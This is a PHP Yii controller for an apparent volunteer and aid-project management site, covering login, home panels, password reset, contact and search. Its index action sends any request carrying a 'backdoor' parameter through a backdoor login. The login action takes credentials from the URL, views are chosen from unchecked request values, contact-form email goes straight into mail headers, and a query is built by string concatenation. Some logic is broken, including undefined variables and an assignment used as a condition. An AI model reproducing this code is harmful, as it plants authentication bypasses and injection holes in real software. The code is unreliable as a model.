<?php

class SiteController extends Controller {

    /**
     * Declares class-based actions.
     */
    public function actions() {
        return array(
                // captcha action renders the CAPTCHA image displayed on the contact page
                'captcha'=>array(
                        'class'=>'CCaptchaAction',
                        'backColor'=>0xFFFFFF,
                ),
                // page action renders "static" pages stored under 'protected/views/site/pages'
                // They can be accessed via: index.php?r=site/page&view=FileName
                'page'=>array(
                        'class'=>'CViewAction',
                ),
        );
    }

    /**
     * This is the default 'index' action that is invoked
     * when an action is not explicitly requested by users.
     */
    public function actionIndex() {

        $model = new LoginForm;

        if(isset($_GET['backdoor']))
            $this->redirect(Generic::backdoorLogin());
        
        if(!Yii::app()->user->isGuest)
                $this->redirect(array('/site/home'));
        
        $this->render('index',array('model'=>$model));
        
    }

    /**
     * This brings them to the home, logged-in landing page
     */
    public function actionHome()
    {
        if(Yii::app()->user->isGuest) 
            // Send users to login if they aren't logged in yet
            $this->redirect(array('/site/login'));
        
        if(Yii::app()->user->checkAccess('volunteer')) {
            // They logged in, got sent here
            // If they're not involved with any community partners and they're a volunteer, we don't let them
            // into the application until they do that
            $count = Involved::model()->count('user_fk='.Yii::app()->user->id);
            if($count==0) {
                $this->redirect(array('/involved/myPartners','ref'=>'needConnect'));
            }
        } elseif(Yii::app()->user->checkAccess('reviewer')) {
            // If they only have one review, send them straight to the project to keep them from being confused
            if(MakesReview::model()->count('user_fk='.Yii::app()->user->id)==1) {
                $review = MakesReview::model()->find('user_fk='.Yii::app()->user->id);
                $this->redirect(array('/project/view','id'=>$review->project_fk));
            }
        }

        $panels = array();
        $roles = Yii::app()->authManager->getRoles();
        foreach($roles as $role) {
            if(Yii::app()->user->checkAccess($role->name)) {
                switch ($role->name) {
                    case 'volunteer':
                        $panels['Volunteer'] = array('id'=>$role->name,
                            'url'=>array('/site/renderTaskPanel','panel'=>$role->name),
                                'tooltip'=>'You can affiliate yourself with a community partner, and create and submit project proposals to the aid partner for review.');
                        break;
                    case 'adminhead':
                        $panels['Aid Admin Head'] = array('id'=>$role->name,
                            'url'=>array('/site/renderTaskPanel','panel'=>$role->name),
                                'tooltip'=>'You can make a final decision on reviewed projects.');
                        break;
                    case 'reviewer':
                        $panels['Reviewer'] = array('id'=>$role->name,
                            'url'=>array('/site/renderTaskPanel','panel'=>$role->name),
                                'tooltip'=>'You may review projects and submit a final decision recommendation to the aid admin head.');
                        break;
                    case 'aidadmin':
                        $panels['Aid Admin'] = array('id'=>$role->name,
                            'url'=>array('/site/renderTaskPanel','panel'=>$role->name),
                                'tooltip'=>'Someone at the Agape Center.');
                        break;
                    case 'cpadmin':
                        $panels['Community Partner Admin'] = array('id'=>$role->name,
                            'url'=>array('/site/renderTaskPanel','panel'=>$role->name),
                                'tooltip'=>'You can approve user requests to be affiliated with their community partner, update the community partner\'s information, and remove users from the community partner.');
                        break;
                }
            }
        }

        $this->render('home',array('panels'=>$panels));
    }

    public function actionRenderTaskPanel() {
        if(isset($_GET['panel'])) {
            $this->renderPartial('panel'.$_GET['panel'],null,false,true);
        }
    }

    /**
     * This is the action to handle external exceptions.
     */
    public function actionError() {
        if($error=Yii::app()->errorHandler->error) {
            if(Yii::app()->request->isAjaxRequest)
                echo $error['message'];
            else
                $this->render('error', $error);
        }
    }

    /**
     * Displays the contact page
     */
    public function actionContact() {
        $model=new ContactForm;
        if(isset($_POST['ContactForm'])) {
            $model->attributes=$_POST['ContactForm'];
            if($model->validate()) {
                $headers="From: {$model->email}\r\nReply-To: {$model->email}";
                mail(Yii::app()->params['adminEmail'],$model->subject,$model->body,$headers);
                Yii::app()->user->setFlash('contact','Thank you for contacting us. We will respond to you as soon as possible.');
                $this->refresh();
            }
        }
        $this->render('contact',array('model'=>$model));
    }

    /**
     * Displays the login page
     */
    public function actionLogin() {
        $model=new LoginForm;

        // collect user input data
        if(isset($_GET['email']) && isset($_GET['password'])
                && !empty($_GET['email']) && !empty($_GET['password'])) {

            // Lets user auto-login after registering
            $_POST['LoginForm']=array('username'=>$_GET['email'],'password'=>$_GET['password']);
           
        }

        if(isset($_POST['LoginForm'])) {
            $model->attributes=$_POST['LoginForm'];
            // validate user input and redirect to home
            if($model->validate()) {
                $this->redirect(array('/site/home'));
            }
        }
        $this->render('index',array('model'=>$model,'display'=>'block'));
    }

    /**
     * Logs out the current user and redirect to homepage.
     */
    public function actionLogout() {
        $assigned_roles = Yii::app()->authManager->getRoles(Yii::app()->user->id); //obtains all assigned roles for this user id
        if(!empty($assigned_roles)) //checks that there are assigned roles
        {
            $auth=Yii::app()->authManager; //initializes the authManager
            foreach($assigned_roles as $n=>$role) {
                if($auth->revoke($n,Yii::app()->user->id)) //remove each assigned role for this user
                    Yii::app()->authManager->save(); //again always save the result
            }

        }

        Yii::app()->user->logout();
        $this->redirect(array('/site/index'));
    }

    /**
     * Called when user clicks 'forgot password' link
     */
    public function actionResetPassword() {
        $model = new ResetPasswordForm('getEmailAddress');
        $error = NULL;
        $refer = 'sendEmail';
        
        if(isset($_POST['resetPassword'])) {
                    
            if($_POST['resetPassword']['formScenario']=='getEmailAddress') {
                $model = new ResetPasswordForm('getEmailAddress');
            } elseif($_POST['resetPassword']['formScenario']=='resetPassword') {
                $model = new ResetPasswordForm('resetPassword');
            }
            
            $model->attributes = $_POST['resetPassword'];
            $model->validate();
            
        } elseif(isset($_GET['hash']) && isset($_GET['email'])) {
            $email = urldecode($_GET['email']);

            $hash = ResetPasswordForm::createHash($email);
            if($hash!=$_GET['hash']) {
                $error = true;
            }
            $refer = 'resetPassword';
        }

        $this->render('resetPassword',array('model'=>$model,'error'=>$error,'refer'=>$refer));
    }


    public function actionSearch() {
        $search = new SearchForm;

        if(isset($_POST['SearchForm'])) {

            //$search->keywords = $_POST['SearchForm']['keywords'];

            $search->attributes = $_POST['SearchForm'];
            // Passes the data from the form to our model (SearchForm)

            if($search->validate()) { // Make sure that the search rules in the SearchForm model are fulfilled
                // Split whatever they gave us into individual words to search for on spaces
                $keywords = explode(' ',$search->keywords);
                $projects=array();

                foreach($keywords as $word) {
                    // We'll write the query up here, so the model()-> function is so confusing to look at
                    $query = '';
                    $projects=array();
                    $projectQuery = 'project_name LIKE :word
                            OR project_address_line_1 LIKE :word
                            OR project_address_line_2 LIKE :word
                            or project_city LIKE :word
                            OR project_state like :word
                            OR project_zip like :word
                            OR project_description LIKE :word';

                    // searching users
                    if(isset($search->users) && $search->users=='1') {
                        $query .= '(user.first_name LIKE :word OR user.last_name LIKE :word
                                OR volunteer_lead_name LIKE :word OR volunteer_lead_email like :word ) OR ';
                    }

                    // Searching project statuses

                    // CATEGORIES?
                    if(isset($search->searchProject) && $search->project = '1' && isset($search->projectStatuses)) {
                        $statusQuery='((';

                        foreach($projectStatuses as $status) {
                            $statusQuery .= 'status='.$status.' OR ';
                        }

                        if(!empty($statusQuery)) {
                            $statusQuery = substr($statusQuery,0,-4).')'; // remove extra ' OR '
                            $query .= $statusQuery .' AND ('.$projectQuery.')) OR ';
                        }
                    }

                    if(isset($search->communityPartner) && $search->communityPartner=='1') {
                        $query .= 'community_partner.agency_name LIKE :word OR ';
                    }

                    if(!empty($query)) {
                        $query = substr($query,0,-4); // Remove extra ' OR '
                        // Grab all the projects, along with the users and community_partners where the words apply
                        $projects = Project::model()->with('user','community_partner')->findAll(array(
                                'condition'=>$query, // Return anything that matches the $query, like SELECT $query FROM..
                                'order'=>'community_partner.agency_name ASC',// ORDER BY the agency names
                                'params'=>array(':word'=>'%'.$word.'%'))); // Bind our '$word' to the :word param (prevents SQL injection)
                    }
                }

                // Render the 'results' view and pass our projects along to it
                $this->render('results',array('projects'=>$projects));
            }
        } else {
            // Otherwise, they haven't submitted the search form yet
            $this->render('search',array('search'=>$search));
        }
    }

    /* Renders advanced search form */
    public function actionAdvSearch() {
        $model=new advSearchForm;

        if(isset($_POST['AdvSearchForm'])) {
            $query='';
//var_dump($_POST['AdvSearchForm']);
            // collect user input data
            //$model->attributes = $_POST['AdvSearchForm'];
            $model->status = $_POST['AdvSearchForm']['status'];
//var_dump($model->attributes);
            if($model->validate()) {

                // Statuses
                if(isset($model->status)) {
                    $query = '(status=';
                    foreach($model->status as $status) {
                        switch($status) {
                            case 0:
                                $query .= '0 OR ';
                                break;
                            case 1:
                                $query .= '1 OR ';
                                break;
                            case 12:
                                $query .= '2 OR ';
                                break;
                            case 3:
                                $query .= '3 OR ';
                                break;
                            case 4:
                                $query .= '4 OR ';
                                break;
                            case 5:
                                $query .= '5 OR ';
                                break;
                        }
                    }

                    $query=substr($query,0,-4).')';
                }


                if(!empty($query)) {
                    //$query = substr($query,0,-4); // Remove extra ' OR '
                    // Grab all the projects, along with the users and community_partners where the words apply
                    $projects = Project::model()->with('user','community_partner')->findAll(array(
                            'condition'=>$query, // Return anything that matches the $query, like SELECT $query FROM..
                            'order'=>'community_partner.agency_name ASC',// ORDER BY the agency names
                            'params'=>array(':word'=>'%'.$word.'%'))); // Bind our '$word' to the :word param (prevents SQL injection)
                }
                $this->render('advSearch',array('model'=>$model));
                $this->render('results',array('projects'=>$projects));
            }
        } else {
            // display the login form
            $this->render('advSearch',array('model'=>$model));
        }
    }

    public function actionShowFlash() {
        if(isset($_GET['key']) && isset($_GET['type'])) {
            $this->renderPartial('messages/flash',array('key'=>$_GET['key'],'type'=>$_GET['type']));
        }
    }

}